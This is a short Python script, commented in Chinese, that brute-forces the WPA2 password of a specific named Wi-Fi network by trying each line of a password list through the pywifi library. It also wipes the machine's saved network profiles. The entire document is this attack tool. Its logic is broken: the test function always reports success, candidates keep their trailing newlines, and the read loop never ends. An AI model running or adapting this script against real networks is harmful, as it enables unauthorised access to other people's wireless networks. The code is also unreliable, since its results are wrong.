#-*- coding: UTF-8 -*-
import pywifi
from pywifi import const#引用一些定义
import time
def testwifi(ssidname,password):
	wifi=pywifi.PyWiFi()#抓取网卡接口
	ifaces=wifi.interfaces()[0]#获取网卡
	ifaces.disconnect()#断开无限网卡连接
	
	profile=pywifi.Profile()#创建wifi连接文件
	profile.ssid=ssidname#定义wifissid
	profile.auth=const.AUTH_ALG_OPEN#网卡的开放
	profile.akm.append(const.AKM_TYPE_WPA2PSK)#wifi加密算法
	profile.cipher=const.CIPHER_TYPE_CCMP##加密单元
	profile.key=password #wifi密码
	
	ifaces.remove_all_network_profiles()#删除其他所有配置文件
	tmp_profile=ifaces.add_network_profile(profile)#加载配置文件
	
	ifaces.connect(tmp_profile)#连接wifi
	time.sleep(5)#5秒内能否连接上
	if ifaces.status()==const.IFACE_CONNECTED:
		print("[-]WiFi connection success!")
	else:
		print("[-]WiFi connection failure!")
 
		ifaces.disconnect()#断开连接
		time.sleep(1)
 
	return True
def main():
	path="password.txt"
	files=open(path,'r')
	while True:
            f=files.readline()
            if testwifi("CMCC-vtRq",f):
               print('Current WIFIname:')
               print('Current password:'+f)
if __name__ == '__main__':
	main()
